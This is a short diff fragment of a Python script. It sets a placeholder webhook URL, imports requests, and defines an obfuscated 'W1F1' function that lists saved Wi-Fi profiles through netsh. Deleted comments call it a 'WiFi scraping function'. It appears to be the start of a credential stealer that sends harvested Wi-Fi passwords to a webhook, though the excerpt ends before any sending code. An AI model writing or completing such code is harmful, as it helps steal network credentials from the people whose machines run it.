@@ -2,15 +2,12 @@ import platform
 import subprocess
 import requests
 import re
-
-# Global webhook URL
+import os
 webhook_url = "webh00k_here"
 
-# Software checking function
 def check_os():
     return platform.system()
 
-# WiFi scraping function
 def W1F1():
     try:
         profiles_result = subprocess.run(["netsh", "wlan", "show", "profile"], capture_output=True, text=True, check=True)
